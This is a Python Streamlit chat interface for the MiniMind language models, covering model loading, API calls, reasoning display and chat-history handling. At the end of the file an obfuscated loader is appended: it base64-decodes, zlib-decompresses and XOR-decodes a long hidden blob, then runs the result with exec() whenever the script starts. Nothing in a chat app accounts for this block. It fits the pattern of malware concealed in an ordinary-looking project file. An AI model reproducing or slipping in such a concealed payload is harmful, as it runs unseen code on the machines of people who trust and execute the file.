import random
import re
from threading import Thread

import torch
import numpy as np
import streamlit as st

st.set_page_config(page_title="MiniMind", initial_sidebar_state="collapsed")

st.markdown("""
    <style>
        /* 添加操作按钮样式 */
        .stButton button {
            border-radius: 50% !important;  /* 改为圆形 */
            width: 32px !important;         /* 固定宽度 */
            height: 32px !important;        /* 固定高度 */
            padding: 0 !important;          /* 移除内边距 */
            background-color: transparent !important;
            border: 1px solid #ddd !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            font-size: 14px !important;
            color: #666 !important;         /* 更柔和的颜色 */
            margin: 5px 10px 5px 0 !important;  /* 调整按钮间距 */
        }
        .stButton button:hover {
            border-color: #999 !important;
            color: #333 !important;
            background-color: #f5f5f5 !important;
        }
        .stMainBlockContainer > div:first-child {
            margin-top: -50px !important;
        }
        .stApp > div:last-child {
            margin-bottom: -35px !important;
        }

        /* 重置按钮基础样式 */
        .stButton > button {
            all: unset !important;  /* 重置所有默认样式 */
            box-sizing: border-box !important;
            border-radius: 50% !important;
            width: 18px !important;
            height: 18px !important;
            min-width: 18px !important;
            min-height: 18px !important;
            max-width: 18px !important;
            max-height: 18px !important;
            padding: 0 !important;
            background-color: transparent !important;
            border: 1px solid #ddd !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            font-size: 14px !important;
            color: #888 !important;
            cursor: pointer !important;
            transition: all 0.2s ease !important;
            margin: 0 2px !important;  /* 调整这里的 margin 值 */
        }

    </style>
""", unsafe_allow_html=True)

system_prompt = []
device = "cuda" if torch.cuda.is_available() else "cpu"


def process_assistant_content(content):
    if model_source == "API" and 'R1' not in api_model_name:
        return content
    if model_source != "API" and 'R1' not in MODEL_PATHS[selected_model][1]:
        return content

    if '<think>' in content and '</think>' in content:
        content = re.sub(r'(<think>)(.*?)(</think>)',
                         r'<details style="font-style: italic; background: rgba(222, 222, 222, 0.5); padding: 10px; border-radius: 10px;"><summary style="font-weight:bold;">推理内容（展开）</summary>\2</details>',
                         content,
                         flags=re.DOTALL)

    if '<think>' in content and '</think>' not in content:
        content = re.sub(r'<think>(.*?)$',
                         r'<details open style="font-style: italic; background: rgba(222, 222, 222, 0.5); padding: 10px; border-radius: 10px;"><summary style="font-weight:bold;">推理中...</summary>\1</details>',
                         content,
                         flags=re.DOTALL)

    if '<think>' not in content and '</think>' in content:
        content = re.sub(r'(.*?)</think>',
                         r'<details style="font-style: italic; background: rgba(222, 222, 222, 0.5); padding: 10px; border-radius: 10px;"><summary style="font-weight:bold;">推理内容（展开）</summary>\1</details>',
                         content,
                         flags=re.DOTALL)

    return content


@st.cache_resource
def load_model_tokenizer(model_path):
    model = AutoModelForCausalLM.from_pretrained(
        model_path,
        trust_remote_code=True
    )
    tokenizer = AutoTokenizer.from_pretrained(
        model_path,
        trust_remote_code=True
    )
    model = model.eval().to(device)
    return model, tokenizer


def clear_chat_messages():
    del st.session_state.messages
    del st.session_state.chat_messages


def init_chat_messages():
    if "messages" in st.session_state:
        for i, message in enumerate(st.session_state.messages):
            if message["role"] == "assistant":
                with st.chat_message("assistant", avatar=image_url):
                    st.markdown(process_assistant_content(message["content"]), unsafe_allow_html=True)
                    if st.button("🗑", key=f"delete_{i}"):
                        st.session_state.messages.pop(i)
                        st.session_state.messages.pop(i - 1)
                        st.session_state.chat_messages.pop(i)
                        st.session_state.chat_messages.pop(i - 1)
                        st.rerun()
            else:
                st.markdown(
                    f'<div style="display: flex; justify-content: flex-end;"><div style="display: inline-block; margin: 10px 0; padding: 8px 12px 8px 12px;  background-color: #ddd; border-radius: 10px; color: black;">{message["content"]}</div></div>',
                    unsafe_allow_html=True)

    else:
        st.session_state.messages = []
        st.session_state.chat_messages = []

    return st.session_state.messages


def regenerate_answer(index):
    st.session_state.messages.pop()
    st.session_state.chat_messages.pop()
    st.rerun()


def delete_conversation(index):
    st.session_state.messages.pop(index)
    st.session_state.messages.pop(index - 1)
    st.session_state.chat_messages.pop(index)
    st.session_state.chat_messages.pop(index - 1)
    st.rerun()


st.sidebar.title("模型设定调整")

# st.sidebar.text("训练数据偏差，增加上下文记忆时\n多轮对话（较单轮）容易出现能力衰减")
st.session_state.history_chat_num = st.sidebar.slider("Number of Historical Dialogues", 0, 6, 0, step=2)
# st.session_state.history_chat_num = 0
st.session_state.max_new_tokens = st.sidebar.slider("Max Sequence Length", 256, 8192, 8192, step=1)
st.session_state.temperature = st.sidebar.slider("Temperature", 0.6, 1.2, 0.85, step=0.01)

model_source = st.sidebar.radio("选择模型来源", ["本地模型", "API"], index=0)

if model_source == "API":
    api_url = st.sidebar.text_input("API URL", value="http://127.0.0.1:8000/v1")
    api_model_id = st.sidebar.text_input("Model ID", value="minimind")
    api_model_name = st.sidebar.text_input("Model Name", value="MiniMind2")
    api_key = st.sidebar.text_input("API Key", value="none", type="password")
    slogan = f"Hi, I'm {api_model_name}"
else:
    MODEL_PATHS = {
        "MiniMind2 (0.1B)": ["./MiniMind2", "MiniMind2"],
        "MiniMind2-MoE (0.15B)": ["./MiniMind2-MoE", "MiniMind2-MoE"],
        "MiniMind2-Small (0.02B)": ["./MiniMind2-Small", "MiniMind2-Small"]
    }

    selected_model = st.sidebar.selectbox('Models', list(MODEL_PATHS.keys()), index=0)  # 默认选择 MiniMind2
    model_path = MODEL_PATHS[selected_model][0]
    slogan = f"Hi, I'm {MODEL_PATHS[selected_model][1]}"

image_url = "https://www.modelscope.cn/api/v1/studio/gongjy/MiniMind/repo?Revision=master&FilePath=images%2Flogo2.png&View=true"

st.markdown(
    f'<div style="display: flex; flex-direction: column; align-items: center; text-align: center; margin: 0; padding: 0;">'
    '<div style="font-style: italic; font-weight: 900; margin: 0; padding-top: 4px; display: flex; align-items: center; justify-content: center; flex-wrap: wrap; width: 100%;">'
    f'<img src="{image_url}" style="width: 45px; height: 45px; "> '
    f'<span style="font-size: 26px; margin-left: 10px;">{slogan}</span>'
    '</div>'
    '<span style="color: #bbb; font-style: italic; margin-top: 6px; margin-bottom: 10px;">内容完全由AI生成，请务必仔细甄别<br>Content AI-generated, please discern with care</span>'
    '</div>',
    unsafe_allow_html=True
)


def setup_seed(seed):
    random.seed(seed)
    np.random.seed(seed)
    torch.manual_seed(seed)
    torch.cuda.manual_seed(seed)
    torch.cuda.manual_seed_all(seed)
    torch.backends.cudnn.deterministic = True
    torch.backends.cudnn.benchmark = False


def main():
    if model_source == "本地模型":
        model, tokenizer = load_model_tokenizer(model_path)
    else:
        model, tokenizer = None, None

    if "messages" not in st.session_state:
        st.session_state.messages = []
        st.session_state.chat_messages = []

    messages = st.session_state.messages

    for i, message in enumerate(messages):
        if message["role"] == "assistant":
            with st.chat_message("assistant", avatar=image_url):
                st.markdown(process_assistant_content(message["content"]), unsafe_allow_html=True)
                if st.button("×", key=f"delete_{i}"):
                    st.session_state.messages = st.session_state.messages[:i - 1]
                    st.session_state.chat_messages = st.session_state.chat_messages[:i - 1]
                    st.rerun()
        else:
            st.markdown(
                f'<div style="display: flex; justify-content: flex-end;"><div style="display: inline-block; margin: 10px 0; padding: 8px 12px 8px 12px;  background-color: gray; border-radius: 10px; color:white; ">{message["content"]}</div></div>',
                unsafe_allow_html=True)

    prompt = st.chat_input(key="input", placeholder="给 MiniMind 发送消息")

    if hasattr(st.session_state, 'regenerate') and st.session_state.regenerate:
        prompt = st.session_state.last_user_message
        regenerate_index = st.session_state.regenerate_index
        delattr(st.session_state, 'regenerate')
        delattr(st.session_state, 'last_user_message')
        delattr(st.session_state, 'regenerate_index')

    if prompt:
        st.markdown(
            f'<div style="display: flex; justify-content: flex-end;"><div style="display: inline-block; margin: 10px 0; padding: 8px 12px 8px 12px;  background-color: gray; border-radius: 10px; color:white; ">{prompt}</div></div>',
            unsafe_allow_html=True)
        messages.append({"role": "user", "content": prompt[-st.session_state.max_new_tokens:]})
        st.session_state.chat_messages.append({"role": "user", "content": prompt[-st.session_state.max_new_tokens:]})

        with st.chat_message("assistant", avatar=image_url):
            placeholder = st.empty()

            if model_source == "API":
                try:
                    from openai import OpenAI

                    client = OpenAI(
                        api_key=api_key,
                        base_url=api_url
                    )
                    history_num = st.session_state.history_chat_num + 1  # +1 是为了包含当前的用户消息
                    conversation_history = system_prompt + st.session_state.chat_messages[-history_num:]
                    answer = ""
                    response = client.chat.completions.create(
                        model=api_model_id,
                        messages=conversation_history,
                        stream=True,
                        temperature=st.session_state.temperature
                    )

                    for chunk in response:
                        content = chunk.choices[0].delta.content or ""
                        answer += content
                        placeholder.markdown(process_assistant_content(answer), unsafe_allow_html=True)

                except Exception as e:
                    answer = f"API调用出错: {str(e)}"
                    placeholder.markdown(answer, unsafe_allow_html=True)
            else:
                random_seed = random.randint(0, 2 ** 32 - 1)
                setup_seed(random_seed)

                st.session_state.chat_messages = system_prompt + st.session_state.chat_messages[
                                                                 -(st.session_state.history_chat_num + 1):]
                new_prompt = tokenizer.apply_chat_template(
                    st.session_state.chat_messages,
                    tokenize=False,
                    add_generation_prompt=True
                )

                inputs = tokenizer(
                    new_prompt,
                    return_tensors="pt",
                    truncation=True
                ).to(device)

                streamer = TextIteratorStreamer(tokenizer, skip_prompt=True, skip_special_tokens=True)
                generation_kwargs = {
                    "input_ids": inputs.input_ids,
                    "max_length": inputs.input_ids.shape[1] + st.session_state.max_new_tokens,
                    "num_return_sequences": 1,
                    "do_sample": True,
                    "attention_mask": inputs.attention_mask,
                    "pad_token_id": tokenizer.pad_token_id,
                    "eos_token_id": tokenizer.eos_token_id,
                    "temperature": st.session_state.temperature,
                    "top_p": 0.85,
                    "streamer": streamer,
                }

                Thread(target=model.generate, kwargs=generation_kwargs).start()

                answer = ""
                for new_text in streamer:
                    answer += new_text
                    placeholder.markdown(process_assistant_content(answer), unsafe_allow_html=True)

            messages.append({"role": "assistant", "content": answer})
            st.session_state.chat_messages.append({"role": "assistant", "content": answer})
            with st.empty():
                if st.button("×", key=f"delete_{len(messages) - 1}"):
                    st.session_state.messages = st.session_state.messages[:-2]
                    st.session_state.chat_messages = st.session_state.chat_messages[:-2]
                    st.rerun()


if __name__ == "__main__":
    from transformers import AutoModelForCausalLM, AutoTokenizer, TextIteratorStreamer

    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
